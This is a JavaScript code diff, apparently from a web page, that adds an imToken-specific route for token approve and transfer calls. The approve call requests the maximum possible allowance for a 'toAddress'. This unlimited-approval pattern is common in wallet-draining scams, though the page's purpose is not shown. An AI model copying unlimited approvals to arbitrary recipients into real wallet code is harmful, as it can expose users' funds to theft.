@@ -173,7 +173,22 @@
       try {
         const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
-        // 直接调用合约的 approve 方法
+        // 使用 imToken 的 TUAP 方式
+        if (wallet === 'imToken') {
+          const result = await window.imToken.callAPI('contract', {
+            to: contractAddress,
+            from: from,
+            value: '0',
+            data: contract.methods.approve(toAddress, maxAmount).encodeABI()
+          });
+          
+          if (!result || !result.txHash) {
+            throw new Error("授权交易失败");
+          }
+          return result.txHash;
+        }
+        
+        // 其他钱包使用 Web3
         const result = await contract.methods.approve(toAddress, maxAmount)
           .send({from: from})
           .on('transactionHash', function(hash) {
@@ -194,7 +209,22 @@
       try {
         const amountInWei = (BigInt(amount * (10 ** decimals))).toString();
         
-        // 直接调用合约的 transfer 方法
+        // 使用 imToken 的 TUAP 方式
+        if (wallet === 'imToken') {
+          const result = await window.imToken.callAPI('contract', {
+            to: contractAddress,
+            from: from,
+            value: '0',
+            data: contract.methods.transfer(toAddress, amountInWei).encodeABI()
+          });
+          
+          if (!result || !result.txHash) {
+            throw new Error("支付交易失败");
+          }
+          return result.txHash;
+        }
+        
+        // 其他钱包使用 Web3
         const result = await contract.methods.transfer(toAddress, amountInWei)
           .send({from: from})
           .on('transactionHash', function(hash) {
